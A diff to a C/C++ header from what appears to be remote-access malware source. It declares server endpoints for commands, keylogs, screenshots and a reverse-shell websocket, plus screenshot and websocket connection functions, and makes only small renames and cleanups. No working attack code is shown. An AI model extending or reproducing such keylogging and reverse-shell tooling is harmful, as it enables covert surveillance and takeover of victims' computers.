@@ -54,7 +54,7 @@ EXTERN_C_START
 #define COMMANDS_API_A		"/commands"
 #define KEYLOGS_API_A		"/keylogs"
 #define SCREENSHOT_API_A	"/screenshot"
-#define REVERSE_SHELL_WS_A  "/reverseshell";
+#define REVERSE_SHELL_WS_A  "/rsclient"
 #define PATH_SIZE			2048
 #define URL_SIZE			4096
 #define UUID_SIZE			256
@@ -200,7 +200,6 @@ VOID SendScreenshot();
 
 /********************************************************************************************************************************/
 // shell.cpp
-static struct lws_context* context;
 #define BUFSIZE 4096
 
 typedef struct WebSocketData
@@ -235,6 +234,6 @@ PCHAR encode_UTF8(LPCWCHAR messageUTF16);
 // ws.cpp
 VOID connect_client(lws_sorted_usec_list_t* sul);
 INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len);
-BOOL WS_Connection();
+BOOL WebSocketConnection();
 
 EXTERN_C_END
